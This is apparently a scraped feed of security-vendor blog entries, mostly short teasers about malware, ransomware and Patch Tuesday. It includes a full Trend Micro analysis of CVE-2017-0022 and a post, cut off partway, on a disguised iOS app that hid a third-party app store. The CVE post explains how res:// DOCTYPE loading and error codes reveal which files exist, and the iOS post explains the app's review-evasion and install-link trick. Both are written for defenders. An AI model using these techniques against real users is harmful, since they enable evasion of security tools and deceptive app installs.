Threat Group 3390 Cyberespionage,"Type: Threat Analysis<h2>Dell SecureWorks Counter Threat UnitTM (CTU) Investigated Activities Associated with Threat Group-3390</h2><a href=""https://www.secureworks.com/research/threat-group-3390-targets-organizations-for-cyberespionage""><img src=""https://www.secureworks.com/~/media/Images/Insights/Things/043 network-cables/things_0043_network-cables-360x190.ashx"" /></a><br /><h3>Category:</h3><span>CTU Research</span><br /><br />Analysis of TG-3390's operations, targeting, and tools led CTU researchers to assess with moderate confidence the group is located in China.",https://www.secureworks.com/research/threat-group-3390-targets-organizations-for-cyberespionage
Sakula Malware Family,"Type: Threat Analysis<a href=""https://www.secureworks.com/research/sakula-malware-family""><img src=""https://www.secureworks.com/~/media/Images/Insights/Things/003 network-patch-panels-enterprise/things_0003_network-patch-panels-enterprise_360x190.ashx"" /></a><br /><h3>Category:</h3><span>CTU Research</span><br /><br />CTU researchers analyzed the Sakula Malware Family which enables an adversary to run interactive commands to download and execute additional components.",https://www.secureworks.com/research/sakula-malware-family
Stegoloader: A Stealthy Information Stealer,"Type: Threat Analysis<a href=""https://www.secureworks.com/research/stegoloader-a-stealthy-information-stealer""><img src=""https://www.secureworks.com/~/media/Images/Insights/Things/004 enterprise-glass-server-room/things_0004_enterprise-glass-wall-server-room_360x190.ashx"" /></a><br /><h3>Category:</h3><span>CTU Research</span><br /><br />",https://www.secureworks.com/research/stegoloader-a-stealthy-information-stealer
TeslaCrypt Ransomware,"Type: Threat Analysis<a href=""https://www.secureworks.com/research/teslacrypt-ransomware-threat-analysis""><img src=""https://www.secureworks.com/~/media/Images/Insights/Things/005 enterprise-server-room/things_0005_enterprise-server-room_360x190.ashx"" /></a><br /><h3>Category:</h3><span>CTU Research</span><br /><br />CTU researchers investigated a new file-encrypting ransomware family named TeslaCrypt, which was distributed by the popular Angler browser exploit kit.",https://www.secureworks.com/research/teslacrypt-ransomware-threat-analysis
Banking Botnets Persist Despite Takedowns,"Type: Threat Analysis<a href=""https://www.secureworks.com/research/banking-botnets-persist-despite-takedowns""><img src=""https://www.secureworks.com/~/media/Images/Insights/Abstracts/005 Technical/abstracts_0005_technical_360x190.ashx"" /></a><br /><h3>Category:</h3><span>CTU Research</span><br /><br />Threats to banks and financial institutions continue to grow and mature as cybercriminals become far more creative and increasingly organized.",https://www.secureworks.com/research/banking-botnets-persist-despite-takedowns
Skeleton Key Malware Analysis,"Type: Threat Analysis<a href=""https://www.secureworks.com/research/skeleton-key-malware-analysis""><img src=""https://www.secureworks.com/~/media/Images/Insights/Abstracts/006 Light-dots/abstracts_0006_lightdots_360x190.ashx"" /></a><br /><h3>Category:</h3><span>CTU Research</span><br /><br />SecureWorks Counter Threat Unit™ researchers discovered malware that bypasses authentication on Active Directory systems.",https://www.secureworks.com/research/skeleton-key-malware-analysis
Dyre Banking Trojan,"Type: Threat Analysis<a href=""https://www.secureworks.com/research/dyre-banking-trojan""><img src=""https://www.secureworks.com/~/media/Images/Insights/Abstracts/024 info-tab5/abstract_0024_infotabs5_360x190.ashx"" /></a><br /><h3>Category:</h3><span>CTU Research</span><br /><br />The Dyre Banking Trojan, a malware that harvests credentials, primarily targeting online banking websites.",https://www.secureworks.com/research/dyre-banking-trojan
CryptoWall Ransomware,"Type: Threat Analysis<a href=""https://www.secureworks.com/research/cryptowall-ransomware""><img src=""https://www.secureworks.com/~/media/Images/Insights/Abstracts/025 screen-text/abstracts_0025_screentext_360x190.ashx"" /></a><br /><h3>Category:</h3><span>CTU Research</span><br /><br />Read why CTU researchers consider CryptoWall to be the largest and most destructive ransomware threat on the Internet as of this publication.",https://www.secureworks.com/research/cryptowall-ransomware
Personalized spam campaign targets Germany,"A new spam campaign targeting German users uses victims’ real details and installs banking malware on compromised computers.<br /><img src=""https://www.symantec.com/connect/sites/default/files/imagecache/blog-featured-image/feature_images/EB-Email-01_2.jpg"" /><br /><a href=""https://www.symantec.com/connect/blogs/personalized-spam-campaign-targets-germany"">Read More</a>",https://www.symantec.com/connect/blogs/personalized-spam-campaign-targets-germany
Microsoft Patch Tuesday – March 2017,"This month the vendor is releasing 18 bulletins, nine of which are rated Critical.<br /><img src=""https://www.symantec.com/connect/sites/default/files/imagecache/blog-featured-image/feature_images/EB-MS-Tuesday_6.jpg"" /><br /><a href=""https://www.symantec.com/connect/blogs/microsoft-patch-tuesday-march-2017"">Read More</a>",https://www.symantec.com/connect/blogs/microsoft-patch-tuesday-march-2017
Spam campaign targets financial institutions with fake security software,"Emails claim to be from HSBC and ask recipients to install fake Rapport security software.<br /><img src=""https://www.symantec.com/connect/sites/default/files/imagecache/blog-featured-image/feature_images/EB-Email-02.jpg"" /><br /><a href=""https://www.symantec.com/connect/blogs/spam-campaign-targets-financial-institutions-fake-security-software"">Read More</a>",https://www.symantec.com/connect/blogs/spam-campaign-targets-financial-institutions-fake-security-software
Latest Intelligence for February 2017,"Number of new malware variants reaches highest level since October 2016 and Symantec uncovers a wider campaign carried out by Shamoon attackers.<br /><img src=""https://www.symantec.com/connect/sites/default/files/imagecache/blog-featured-image/feature_images/EB-Stats-03_1.jpg"" /><br /><a href=""https://www.symantec.com/connect/blogs/latest-intelligence-february-2017"">Read More</a>",https://www.symantec.com/connect/blogs/latest-intelligence-february-2017
Shamoon: Multi-staged destructive attacks limited to specific targets,"Recent attacks involving the destructive malware Shamoon appear to be part of a much wider campaign in the Middle East and beyond.<br /><img src=""https://www.symantec.com/connect/sites/default/files/imagecache/blog-featured-image/feature_images/EB-Map-Networks_4.jpg"" /><br /><a href=""https://www.symantec.com/connect/blogs/shamoon-multi-staged-destructive-attacks-limited-specific-targets"">Read More</a>",https://www.symantec.com/connect/blogs/shamoon-multi-staged-destructive-attacks-limited-specific-targets
Android ransomware requires victim to speak unlock code,"Latest Android.Lockdroid.E variant uses speech recognition instead of typing for unlock code input.<br /><img src=""https://www.symantec.com/connect/sites/default/files/imagecache/blog-featured-image/feature_images/EB-Header-image109_3.jpg"" /><br /><a href=""https://www.symantec.com/connect/blogs/android-ransomware-requires-victim-speak-unlock-code"">Read More</a>",https://www.symantec.com/connect/blogs/android-ransomware-requires-victim-speak-unlock-code
Symantec and other industry leaders announce expanded Cyber Threat Alliance,"Cybersecurity consortium formally establishes rapid security intelligence sharing system to combat cybercrime and advanced attacks.<br /><img src=""https://www.symantec.com/connect/sites/default/files/imagecache/blog-featured-image/feature_images/EB-Stats-02_0.jpg"" /><br /><a href=""https://www.symantec.com/connect/blogs/symantec-and-other-industry-leaders-announce-expanded-cyber-threat-alliance"">Read More</a>",https://www.symantec.com/connect/blogs/symantec-and-other-industry-leaders-announce-expanded-cyber-threat-alliance
"Sage 2.0 ransomware delivered by Pandex spambot, mimics Cerber routines","New variants of Sage ransomware sport Cerber-like behavior, although no definitive link was found between the two families.<br /><img src=""https://www.symantec.com/connect/sites/default/files/imagecache/blog-featured-image/feature_images/ThinkstockPhotos-639140974_0.jpg"" /><br /><a href=""https://www.symantec.com/connect/blogs/sage-20-ransomware-delivered-pandex-spambot-mimics-cerber-routines"">Read More</a>",https://www.symantec.com/connect/blogs/sage-20-ransomware-delivered-pandex-spambot-mimics-cerber-routines
Attackers target dozens of global banks with new malware,"Watering hole attacks attempt to infect more than 100 organizations in 31 different countries.<br /><img src=""https://www.symantec.com/connect/sites/default/files/imagecache/blog-featured-image/feature_images/virtual_abstraction.jpg"" /><br /><a href=""https://www.symantec.com/connect/blogs/attackers-target-dozens-global-banks-new-malware"">Read More</a>",https://www.symantec.com/connect/blogs/attackers-target-dozens-global-banks-new-malware
Latest Intelligence for January 2017,"The email malware rate drops due to Necurs botnet inactivity and two new Android malware families appeared.<br /><img src=""https://www.symantec.com/connect/sites/default/files/imagecache/blog-featured-image/feature_images/intelligence.jpg"" /><br /><a href=""https://www.symantec.com/connect/blogs/latest-intelligence-january-2017"">Read More</a>",https://www.symantec.com/connect/blogs/latest-intelligence-january-2017
Android ransomware repurposes old dropper techniques,"Android ransomware is now using dropper techniques to drop malware on rooted devices as well as an inefficient 2D barcode ransom demand.<br /><img src=""https://www.symantec.com/connect/sites/default/files/imagecache/blog-featured-image/feature_images/phone-alert.jpg"" /><br /><a href=""https://www.symantec.com/connect/blogs/android-ransomware-repurposes-old-dropper-techniques"">Read More</a>",https://www.symantec.com/connect/blogs/android-ransomware-repurposes-old-dropper-techniques
Android ad malware on Google Play combines three deception techniques,"Three apps on Google Play use delayed attacks, self-naming tricks, and an attack list dictated by a command and control server to click on ads in the background without the user's knowledge.<br /><img src=""https://www.symantec.com/connect/sites/default/files/imagecache/blog-featured-image/feature_images/EB-generic-tablet.jpg"" /><br /><a href=""https://www.symantec.com/connect/blogs/android-ad-malware-google-play-combines-three-deception-techniques"">Read More</a>",https://www.symantec.com/connect/blogs/android-ad-malware-google-play-combines-three-deception-techniques
"Greenbug cyberespionage group targeting Middle East, possible links to Shamoon","Greenbug may answer the question of how Shamoon obtains the stolen credentials needed to carry out its disk-wiping attacks.<br /><img src=""https://www.symantec.com/connect/sites/default/files/imagecache/blog-featured-image/feature_images/ThinkstockPhotos-507456466.jpg"" /><br /><a href=""https://www.symantec.com/connect/blogs/greenbug-cyberespionage-group-targeting-middle-east-possible-links-shamoon"">Read More</a>",https://www.symantec.com/connect/blogs/greenbug-cyberespionage-group-targeting-middle-east-possible-links-shamoon
Microsoft Patch Tuesday – January 2017,"This month the vendor has released four bulletins, one of which is rated Critical.<br /><img src=""https://www.symantec.com/connect/sites/default/files/imagecache/blog-featured-image/feature_images/EB-MS-Tuesday_5.jpg"" /><br /><a href=""https://www.symantec.com/connect/blogs/microsoft-patch-tuesday-january-2017"">Read More</a>",https://www.symantec.com/connect/blogs/microsoft-patch-tuesday-january-2017
"Airport boarding gate display leaks booking codes, puts passenger data at risk","Attackers could gain full control over passenger bookings, cancel flights, and steal sensitive information with leaked booking codes.<br /><img src=""https://www.symantec.com/connect/sites/default/files/imagecache/blog-featured-image/feature_images/EB-Map-Networks_1.png"" /><br /><a href=""https://www.symantec.com/connect/blogs/airport-boarding-gate-display-leaks-booking-codes-puts-passenger-data-risk"">Read More</a>",https://www.symantec.com/connect/blogs/airport-boarding-gate-display-leaks-booking-codes-puts-passenger-data-risk
Latest Intelligence for December 2016,"The number of web attacks blocked per day were up by almost 100,000, and Symantec helps law enforcement crack down on cybercrime.<br /><img src=""https://www.symantec.com/connect/sites/default/files/imagecache/blog-featured-image/feature_images/EB-Stats-02.jpg"" /><br /><a href=""https://www.symantec.com/connect/blogs/latest-intelligence-december-2016"">Read More</a>",https://www.symantec.com/connect/blogs/latest-intelligence-december-2016
Bayrob: Three suspects extradited to face charges in US,"Symantec’s assistance paves way for long-running FBI investigation into gang that stole up to $35 million from victims.<br /><img src=""https://www.symantec.com/connect/sites/default/files/imagecache/blog-featured-image/feature_images/ThinkstockPhotos-517416880.jpg"" /><br /><a href=""https://www.symantec.com/connect/blogs/bayrob-three-suspects-extradited-face-charges-us"">Read More</a>",https://www.symantec.com/connect/blogs/bayrob-three-suspects-extradited-face-charges-us
Latest Intelligence for November 2016,"Email malware nearly doubles to one in 85 emails and spam rate rises for third month in a row.<br /><img src=""https://www.symantec.com/connect/sites/default/files/imagecache/blog-featured-image/feature_images/EB-Stats-01.jpg"" /><br /><a href=""https://www.symantec.com/connect/blogs/latest-intelligence-november-2016"">Read More</a>",https://www.symantec.com/connect/blogs/latest-intelligence-november-2016
Microsoft Patch Tuesday – December 2016,"This month the vendor is releasing 12 bulletins, six of which are rated Critical.<br /><img src=""https://www.symantec.com/connect/sites/default/files/imagecache/blog-featured-image/feature_images/EB-MS-Tuesday_3_0.jpg"" /><br /><a href=""https://www.symantec.com/connect/blogs/microsoft-patch-tuesday-december-2016"">Read More</a>",https://www.symantec.com/connect/blogs/microsoft-patch-tuesday-december-2016
PowerShell threats surge: 95.4 percent of analyzed scripts were malicious,"Symantec analyzed 111 threat families that use PowerShell, finding that they leverage the framework to download payloads and traverse through networks.<br /><img src=""https://www.symantec.com/connect/sites/default/files/imagecache/blog-featured-image/feature_images/ThinkstockPhotos-639140974.jpg"" /><br /><a href=""https://www.symantec.com/connect/blogs/powershell-threats-surge-954-percent-analyzed-scripts-were-malicious"">Read More</a>",https://www.symantec.com/connect/blogs/powershell-threats-surge-954-percent-analyzed-scripts-were-malicious
CVE-2017-0022: Microsoft Patches a Vulnerability Exploited by AdGholas and Neutrino,"<p>Part of <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/microsoft-patch-tuesday-march-2017-18-security-bulletins-9-critical-9-important/"">this month’s Patch Tuesday</a> is an update for a zero-day <a href=""https://cwe.mitre.org/data/definitions/200.html"">information disclosure</a> vulnerability (<a href=""http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0022"">CVE-2017-0022</a>), which we privately reported to Microsoft in September 2016. This vulnerability was used in the AdGholas malvertising campaign and later integrated into the Neutrino exploit kit. CVE-2017-0022 likely replaced the similar CVE-2016-3298 and CVE-2016-3351 vulnerabilities from the same campaign, which were addressed by previous patches.</p>
<p>An attacker exploiting CVE-2017-0022 could use phishing attacks to lure potential targets to malicious websites. Successful exploitation of this vulnerability could allow a cybercriminal access to information on the files found in the user’s system. In particular, the attacker would be able to detect if the system is using specific security solutions—especially ones that analyze malware.</p>
<p><strong><em>Analysis of CVE-2017-0022</em></strong></p>
<p><strong><em> </em></strong>The sample we analyzed was found in the wild, first with the AdGholas campaign in July 2016, and again with the Neutrino exploit kit in September 2016.</p>
<p>A typical malvertising campaign exploiting the CVE-2017-0022 vulnerability follows this flow:</p>
<p><img alt="""" class=""aligncenter size-large wp-image-77678"" height=""547"" src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/cve-2017-0022-flow-1024x547.jpg"" width=""1024"" /></p>
<p>Here is a breakdown of how CVE-2017-0022 detects the existence of certain files in a user’s system:</p>
<p><img alt="""" class=""aligncenter size-large wp-image-77679"" height=""559"" src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/cve-2017-0022-code-1-1024x559.jpg"" width=""1024"" /></p>
<p>Microsoft.XMLDOM has a function defined as follows:</p>
<blockquote><p>LoadXML( string )</p></blockquote>
<p>The string can be in the <a href=""https://technet.microsoft.com/pt-br/subscriptions/downloads/ms256059(v=vs.110)"">following format</a>:</p>
<blockquote><p>&lt;!DOCTYPE rootElement SYSTEM &#8220;URIreference&#8221;&gt;</p></blockquote>
<p>The URIreference can be a string which represents res protocol resources. The format is <a href=""https://msdn.microsoft.com/en-us/library/jj710218(v=vs.85).aspx"">as follows</a>:</p>
<blockquote><p>res://sFile[/sType]/sID</p></blockquote>
<p>The zero day vulnerability exists in the following <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/ms648009(v=vs.85).aspx"">version resource</a>:</p>
<div class=""contentHolderPred17 predictionArticle"">
<table class=""centerTable"" style=""width: 600px; margin: 0px auto; text-align: left; line-height: 15px;"">
<tbody>
<tr>
<td width=""300"">RT_ICON</p>
<p>MAKEINTRESOURCE (3)</td>
<td width=""300"">Hardware-dependent icon resource.</td>
</tr>
<tr>
<td width=""300"">RT_MESSAGETABLE</p>
<p>MAKEINTRESOURCE (11)</td>
<td width=""300"">Message-table entry.</td>
</tr>
<tr>
<td width=""300"">RT_VERSION</p>
<p>MAKEINTRESOURCE (16)</td>
<td width=""300"">Version resource.</td>
</tr>
<tr>
<td width=""300"">RT_MANIFEST</p>
<p>MAKEINTRESOURCE (24)</td>
<td width=""300"">Side-by-side assembly manifest.</td>
</tr>
</tbody>
</table>
<p><img alt="""" class=""aligncenter size-full wp-image-77680"" height=""115"" src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/cve-2017-0022-code-2.jpg"" width=""1020"" /></p>
<p><img alt="""" class=""aligncenter size-full wp-image-77681"" height=""130"" src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/cve-2017-0022-code-3.jpg"" width=""844"" /></p>
<p>The mshtml module will instruct the above function to process the res protocol.</p>
<p>If the sFile does not exist, the LoadLibraryExW will fail and return errorCode 0x80070485. However, if the file is found to exist, the function will get the resource located in the sFile. This resource is not a valid DTD file, thus when the XMLParser::Run processes the resource as a DTD file, it will return the errorCode 0x80004005.</p>
<p><img alt="""" class=""aligncenter size-full wp-image-77682"" height=""164"" src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/cve-2017-0022-code-4.jpg"" width=""788"" /></p>
<p><img alt="""" class=""aligncenter size-full wp-image-77683"" height=""251"" src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/cve-2017-0022-code-5.jpg"" width=""670"" /></p>
<p>Using the different return values, the vulnerability can check if a specific sFile exists or not.</p>
<p>If CVE-2017-0022 is integrated into an exploit kit such as Neutrino, it analyzes the system for signs of security software and checks if the browser is using any sandbox solutions. In addition, it inspects the system for the presence of any packet capture software. A sample code can be found below:</p>
<p><img alt="""" class=""aligncenter size-large wp-image-77684"" height=""48"" src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/cve-2017-0022-code-6-1024x48.jpg"" width=""1024"" /></p>
<p><strong><em>Patch Analysis</em></strong></p>
<p><strong><em> </em></strong>Microsoft’s Patch Tuesday for March addressed this vulnerability via the <a href=""https://technet.microsoft.com/library/security/MS17-022"">MS17-022</a> security bulletin, which changed how MSXML handles objects in memory.   Cybercriminals can often resort to exploiting non-critical vulnerabilities given that these kinds of bugs tend to be put on the backburner when it comes to updates unless given specific attention.</p>
<p><strong><em> </em></strong>A sample code before patching can be seen below:</p>
<p><img alt="""" class=""aligncenter size-full wp-image-77685"" height=""783"" src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/cve-2017-0022-code-7.jpg"" width=""889"" /></p>
<p>In contrast, here is the code after patching:</p>
<p><img alt="""" class=""aligncenter size-full wp-image-77686"" height=""783"" src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/cve-2017-0022-code-8.jpg"" width=""889"" /></p>
<p>Before patching, if file exists, IsCrossDomainDownload is set as true, otherwise do not set IsCrossDomainDownload. After the vulnerability is patched, IsCrossDomainDownload will be true whether or not the file exists.</p>
<p>In xmlparser::run function, has the following code:</p>
<p><img alt="""" class=""aligncenter size-full wp-image-77687"" height=""382"" src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/cve-2017-0022-code-9.jpg"" width=""776"" /></p>
<p>If IsCrossDomainDownlaod is true, it will set the errorCode to 0x80004005. After it is patched, the return errorCode will be 0x80004005 whether or not the file exists.</p>
<p><strong><em>Trend Micro Solutions</em></strong></p>
<p><strong><em> </em></strong>In addition to Microsoft’s security update, users can take steps to ensure that their system’s exposure to threats are minimized. Keeping up-to-date with the latest patches plays a critical role in mitigating the risks for end-users and especially businesses.</p>
<p><a href=""http://www.trendmicro.com/us/enterprise/cloud-solutions/deep-security/"">Trend Micro</a>™ <a href=""http://www.trendmicro.com/us/enterprise/cloud-solutions/deep-security/"">Deep Security</a>™ protects networks through this Deep Packet Inspection (DPI) rule:</p>
<ul>
<li>1008173-Microsoft XML Core Service Information Disclosure Vulnerability (CVE-2017-0022)</li>
</ul>
<p>TippingPoint customers are protected from attacks exploiting these vulnerabilities with these MainlineDV filters:</p>
<ul>
<li>27047: HTTP: Microsoft Internet Explorer parseError Information Disclosure Vulnerability</li>
<li>27061: HTTP:  Microsoft Internet Explorer ActiveX parseError.errorCode Invocation</li>
</ul>
<p>Trend Micro’s <a href=""http://www.trendmicro.com/us/enterprise/product-security/vulnerability-protection/"">Vulnerability Protection</a> and <a href=""http://www.trendmicro.com/us/enterprise/product-security/officescan/"">OfficeScan</a>’s Intrusion Defense Firewall plug-in shield endpoints from known and unknown vulnerability exploits before patches are deployed.</p>
<p><strong><em>With additional insights from Joseph C. Chen</em></strong></p>
<p><strong><em> </em></strong><strong><em>Trend Micro would also like to thank </em></strong><a href=""https://twitter.com/kafeine""><strong><em>@kafeine</em></strong></a><strong><em> for his contribution to this article.</em></strong></p>
</div>
<p>Post from: <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/"">Trendlabs Security Intelligence Blog - by Trend Micro</a></p>
<p><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/cve-2017-0022-microsoft-patches-vulnerability-exploited-adgholas-neutrino/"" rel=""nofollow"">CVE-2017-0022: Microsoft Patches a Vulnerability Exploited by AdGholas and Neutrino</a></p>
<div class=""feedflare"">
<a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=N0Xn-9PoLag:vZOUCKara8s:yIl2AUoC8zA""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=yIl2AUoC8zA"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=N0Xn-9PoLag:vZOUCKara8s:F7zBnMyn0Lo""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=N0Xn-9PoLag:vZOUCKara8s:F7zBnMyn0Lo"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=N0Xn-9PoLag:vZOUCKara8s:qj6IDK7rITs""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=qj6IDK7rITs"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=N0Xn-9PoLag:vZOUCKara8s:V_sGLiPBpWU""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=N0Xn-9PoLag:vZOUCKara8s:V_sGLiPBpWU"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=N0Xn-9PoLag:vZOUCKara8s:l6gmwiTKsz0""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=l6gmwiTKsz0"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=N0Xn-9PoLag:vZOUCKara8s:gIN9vFwOqvQ""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=N0Xn-9PoLag:vZOUCKara8s:gIN9vFwOqvQ"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=N0Xn-9PoLag:vZOUCKara8s:TzevzKxY174""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=TzevzKxY174"" /></a>
</div><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/Anti-MalwareBlog/~4/N0Xn-9PoLag"" width=""1"" />",http://feeds.trendmicro.com/~r/Anti-MalwareBlog/~3/N0Xn-9PoLag/
Third-Party App Stores Delivered via the iOS App Store,"<p>The iOS ecosystem is usually described as a closed ecosystem, under the strict control of Apple. However, there are still ways to get around this tight control. Remember the <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/how-a-third-party-app-store-abuses-apples-developer-enterprise-program-to-serve-adware/"">Haima</a> app? That method relied on enterprise certificates from Apple—which are costly, since the certificates needed are changed very frequently.</p>
<p>We are currently seeing how third-party app stores are improving. Recently, we saw an app that leads to a third-party app store being offered <em>on</em> the official iOS App Store. To evade detection, this app was concealed as a legitimate app. In at least one case, an app used for jailbreaking was available via this third-party app store.</p>
<p>It is unclear exactly who the target of this malicious app is. The account book app is designed with Japanese characters, but the app store itself is written in Mandarin Chinese. In addition, it was found in the App Store of multiple countries.</p>
<p>This app is named “こつこつ家計簿-無料のカレンダー家計簿”, which translates to “Household Accounts App”. This app appears to be a financial helper app for families, but it is actually a third-party app store. Apple has since removed it from the App Store.</p>
<p align=""center""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty1a.png"" /></p>
<p align=""center""><i>Figure 1. Household account app in iOS App Store</i></p>
<table align=""center"">
<tbody>
<tr>
<td><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty2a.png"" /></td>
<td><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty3a.png"" /></td>
</tr>
</tbody>
</table>
<p align=""center""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty4a.png"" /></p>
<p align=""center""><i>Figures 2-4. Various stages of app launch</i></p>
<p>The code (Figure 5, below) reveals that it checks the <em>PPAASSWOpenKey</em> key in the system’s user preference <em>plist </em>when it first starts up. This key is used by the app to determine if the app has run before: as it hasn’t, the key does not exist. The app switches to the <em>else</em> branch, which requests the right to use data to access the third-party store. Because of iOS’s permission mechanism, this request needs to be approved specifically by the user (Figure 2). The first request therefore fails, so the app jumps to the account book view and pretends to be a legitimate app (Figure 3). The text in Figure 3 claims that data access is necessary for exporting information from the app.</p>
<p align=""center""><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty5.png""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty5tb.png"" /></a></p>
<p align=""center""><i>Figure 5. Code for switching to account book view (Click to enlarge)</i></p>
<p style=""margin-top: 0in; line-height: 15.75pt; vertical-align: baseline;""><span>So long as the app is not closed or goes to the background, the app will stay in the account book view. However, once it enters the background, it again attempts to connect to the third-party store. This time, it should succeed, and instead of seeing the account book view, the user will instead see the third-party app store (Figure 4). </span></p>
<p align=""center""><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty6.png""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty6tb.png"" /></a></p>
<p align=""center""><i>Figure 5. Code for switching to third-party app store view (Click to enlarge)</i></p>
<p>Why would the creators of the third-party app store need this particular behavior? Putting their app store inside Apple&#8217;s official one makes it easier for would-be users to access it, but subterfuge is needed to pass Apple’s scrutiny.</p>
<p><em><strong>Installing the apps</strong></em></p>
<p>After successfully making it into the App Store, the third-party app store then needs to be able to install apps. To do this, the app&#8217;s creator employs a technique generally used to install apps signed with enterprise certificates.</p>
<p>The technique involves the creation of a plist file, which is used to install apps. Figure 7 shows an example plist file (note that this file is not the same as those used by this third-party store).</p>
<p align=""center""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty7a.png"" /></p>
<p align=""center""><i>Figure 7. Sample plist file</i></p>
<p>Then, creating a link as shown below:</p>
<ul>
<li><em>itms-services://?action=download-manifest&amp;amp;url=https://{web server address}/install_app.plist.</em></li>
</ul>
<p>By opening the URL, the app is installed. For apps signed with an Apple certificate, there&#8217;s an additional catch: the app must have been purchased with the user&#8217;s Apple ID. This is why the app asks for the user&#8217;s Apple ID, so it can complete the purchase process:</p>
<table align=""center"">
<tbody>
<tr>
<td><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty8a.png"" /></td>
<td><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty9a.png"" /></td>
</tr>
<tr>
<td><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty10a.png"" /></td>
<td><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty11a.png"" /></td>
</tr>
</tbody>
</table>
<p align=""center""><i>Figures 8-11. Stages of app installation</i></p>
<p align=""center""><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty12.png""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty12tb.png"" /></a></p>
<p align=""center""><i>Figure 12. Code for creation of plist file and installation link (Click to enlarge)</i></p>
<p align=""center""><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty13.png""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty13tb.png"" /></a></p>
<p align=""center""><i>Figure 13. Code for creation of app installation process (Click to enlarge)</i></p>
<p><em><strong>Malware Distribution</strong></em></p>
<p>In addition to apps already present in the App Store, it can also sell apps which are not normally distributed via the App Store. Unfortunately, this can include malware and other unwanted applications.</p>
<p>An example is the app called “PG Client”, which is a tool for jailbreaking iOS devices. It was once available on the App Store, but has already been removed. It is still available for download via the third-party app store:</p>
<p align=""center""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty17.png"" /></p>
<p align=""center""><i>Figure 14. PG Client</i></p>
<p>Other malicious apps will often ask users to download the <em>PPHelper</em> app on their PC, which is also an iOS jailbreaking tool. This is installed on a PC/Mac and the user is asked to connect their iOS device to the said PC/Mac. <em>PPHelper</em> gets some files associated with the user&#8217;s authorization from the device and communicates with it as if it was iTunes, effectively bypassing some of the DRM protection of iOS.</p>
<table align=""center"">
<tbody>
<tr>
<td><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty14.png"" /></td>
<td><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty15.png"" /></td>
</tr>
</tbody>
</table>
<p align=""center""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty16.png"" /></p>
<p align=""center""><i>Figures 15-17. Stages of requesting user to connect PC helper app </i></p>
<p align=""center""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty18.png"" /><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty19.png"" /></p>
<p align=""center""><i>Figures 18-19. Code requesting the user&#8217;s device authorization</i></p>
<p><em><strong>Promoting Other Apps For Money</strong></em></p>
